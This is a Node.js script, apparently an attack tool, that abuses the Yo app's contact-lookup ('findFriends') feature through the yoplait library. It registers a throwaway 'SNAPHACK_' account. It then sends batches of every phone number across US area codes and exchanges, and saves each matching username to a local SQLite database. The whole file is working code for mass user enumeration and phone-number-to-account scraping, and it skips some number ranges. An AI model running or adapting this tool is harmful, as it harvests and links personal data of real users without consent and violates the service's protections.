var yoplait = require('yoplait');
var list = require('./exchanges.json');
var codes = require('./areacodes.json');
var format = require('string-format-js');
var sleep = require('sleep');
var fs = require("fs");
var util = require('util');
var file = "yodumb.db";
var sqlite3 = require("sqlite3").verbose();
var exists = fs.existsSync(file);

if(!exists) {
  console.log("Creating DB file.");
  fs.openSync(file, "w");
}

var db = new sqlite3.Database(file);

var udid = yoplait.genUdid()
  , username = 'SNAPHACK_' + Date.now();

db.serialize(function() {
  if(!exists) {
    db.run("CREATE TABLE yo (username UNIQUE)");
  }

console.log('signing up \'' + username + '\' with udid ' + udid)
yoplait.signUp(username, udid, udid, function(err, yo) {
  if (err) {
    return console.log('sign up failed!: ', err)
  }



for(var area in codes['areacodes']){
  for(var ex in list['exchange']){
    // console.log(codes['areacodes'][area]);
    // console.log(list['exchange'][ex]);
    var searchString = "";
    for(var i = 0; i < 1000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['exchange'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
            console.log(data);
            var stmt = db.prepare("INSERT OR REPLACE INTO yo VALUES (?)");

            for(var foo in data){
              stmt.run(data[foo]['username']);
            }

            stmt.finalize();
          }
      });

    searchString = "";
    for(var i = 1000; i < 2000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['exchange'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
        console.log(data);
            var stmt = db.prepare("INSERT OR REPLACE INTO yo VALUES (?)");

            for(var foo in data){
              stmt.run(data[foo]['username']);
            }

            stmt.finalize();

          }
      });
 
    searchString = "";
    for(var i = 2000; i < 3000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['exchange'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
             console.log(data);
            var stmt = db.prepare("INSERT OR REPLACE INTO yo VALUES (?)");

            for(var foo in data){
              stmt.run(data[foo]['username']);
            }

            stmt.finalize();
          }
      });

    var searchString = "";
    for(var i = 3000; i < 4000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['exchange'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
             console.log(data);
            var stmt = db.prepare("INSERT OR REPLACE INTO yo VALUES (?)");

            for(var foo in data){
              stmt.run(data[foo]['username']);
            }

            stmt.finalize();
          }
      });

    var searchString = "";
    for(var i = 5000; i < 6000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['exchange'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
             console.log(data);
            var stmt = db.prepare("INSERT OR REPLACE INTO yo VALUES (?)");

            for(var foo in data){
              stmt.run(data[foo]['username']);
            }

            stmt.finalize();
          }
      });

    searchString = "";
    for(var i = 7000; i < 8000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['exchange'][ex], i);
    }
    foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
             console.log(data);
            var stmt = db.prepare("INSERT OR REPLACE INTO yo VALUES (?)");

            for(var foo in data){
              stmt.run(data[foo]['username']);
            }

            stmt.finalize();
          }
      });

    searchString = "";
    for(var i = 8000; i < 10000; i++){
      searchString+='+1%s%s%04d,'.format(codes['areacodes'][area], list['exchange'][ex], i);
    }
    var foonumbers = {numbers:searchString, udid: udid};
      yo.findFriends(foonumbers, function(err, data){
          if(err){
            console.log(err);
          }else{
             console.log(data);
            var stmt = db.prepare("INSERT OR REPLACE INTO yo VALUES (?)");

            for(var foo in data){
              stmt.run(data[foo]['username']);
            }

            stmt.finalize();
          }
      });
    }
  }

});
});
  db.close();